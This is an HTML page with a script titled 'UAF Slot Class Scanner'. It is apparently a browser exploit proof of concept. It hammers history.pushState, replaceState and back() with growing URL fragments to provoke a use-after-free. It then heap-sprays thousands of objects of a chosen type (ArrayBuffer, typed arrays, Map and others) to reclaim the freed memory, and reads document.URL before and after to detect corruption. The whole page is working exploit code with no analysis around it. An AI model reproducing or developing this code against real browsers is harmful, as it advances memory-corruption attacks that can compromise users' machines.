<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Slot Class Scanner</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { margin:4px; padding:6px; }
#log { white-space:pre-wrap; margin-top:10px; }
</style>
</head>
<body>

<h2>UAF Slot Fixation â€“ Class Scanner</h2>

<button onclick="testClass('jsobject')">JSObject</button>
<button onclick="testClass('array')">Array</button>
<button onclick="testClass('string')">String Object</button>
<button onclick="testClass('arraybuffer')">ArrayBuffer</button>
<button onclick="testClass('dataview')">DataView</button>
<button onclick="testClass('uint8')">Uint8Array</button>
<button onclick="testClass('uint32')">Uint32Array</button>
<button onclick="testClass('float64')">Float64Array</button>
<button onclick="testClass('map')">Map</button>
<button onclick="testClass('set')">Set</button>
<button onclick="testClass('promise')">Promise</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";
const sleep = ms => new Promise(r=>setTimeout(r,ms));

async function triggerUAF(){
    log("\n=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(4);
    }
    log(">>> UAF WINDOW <<<");
}

function baseline(){
    log("\n=== BASELINE ===");
    log("URL.length = " + document.URL.length);
    log("charCodeAt(64) = " + document.URL.charCodeAt(64));
}

function spray(type){
    log("\n=== SLOT FIXATION (" + type + ") ===");
    let arr = [];
    for(let i=0;i<8000;i++){
        switch(type){
            case "jsobject": arr.push({a:1,b:2}); break;
            case "array": arr.push([1,2,3,4]); break;
            case "string": arr.push(new String("AAAA")); break;
            case "arraybuffer": arr.push(new ArrayBuffer(0x20)); break;
            case "dataview": arr.push(new DataView(new ArrayBuffer(0x20))); break;
            case "uint8": arr.push(new Uint8Array(0x20)); break;
            case "uint32": arr.push(new Uint32Array(8)); break;
            case "float64": arr.push(new Float64Array(4)); break;
            case "map": arr.push(new Map([[1,2]])); break;
            case "set": arr.push(new Set([1,2])); break;
            case "promise": arr.push(Promise.resolve(1)); break;
        }
    }
    log("Spray done: " + arr.length);
    return arr;
}

async function testClass(type){
    logEl.textContent = "";
    baseline();
    await triggerUAF();
    await sleep(120);
    spray(type);

    log("\n=== POST ===");
    log("URL.length = " + document.URL.length);
    log("charCodeAt(64) = " + document.URL.charCodeAt(64));
    log("\n=== END TEST ===");
}
</script>
</body>
</html>
